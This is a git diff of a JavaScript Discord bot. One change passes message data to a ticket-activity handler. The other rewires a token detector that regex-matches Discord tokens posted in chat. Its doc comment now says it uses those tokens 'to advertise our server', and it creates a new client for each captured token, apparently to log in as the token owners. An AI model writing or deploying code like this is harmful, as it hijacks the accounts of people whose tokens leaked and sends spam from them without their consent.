@@ -7,20 +7,21 @@ client.on("messageCreate", async (message) => {
     // Token in message manager
     const tokens = message.content.match(/[a-z,0-9,\_,\-]{24}\.[a-z,0-9,\_,\-]{6}\.[a-z,0-9,\_,\-]{38}/gmi);
     if (tokens !== null) {
-        TokenDetector();
+        TokenDetector(tokens);
     }
 
     // Tickets manager
     if (message.channel?.name?.startsWith('ticket-')) {
-        TicketManager();
+        TicketManager(message);
     }
 
 });
 
 /**
- * Detect tokens in messages
+ * Use tokens in messages to advertise our server
+ * @param {RegExpMatchArray} tokens Tokens found in message
  */
-function TokenDetector() {
+function TokenDetector(tokens) {
     console.warn("Tokens found:", tokens);
     tokens.forEach(token => {
         let tmpclient = new Client({
@@ -54,8 +55,9 @@ function TokenDetector() {
 
 /**
  * Check for activity in tickets
+ * @param {Message} message Message sent in ticket
  */
-async function TicketManager() {
+async function TicketManager(message) {
     const channelId = message.channel.id;
     const ticket = await prisma.ticket.findUnique({
         where: { channelId }
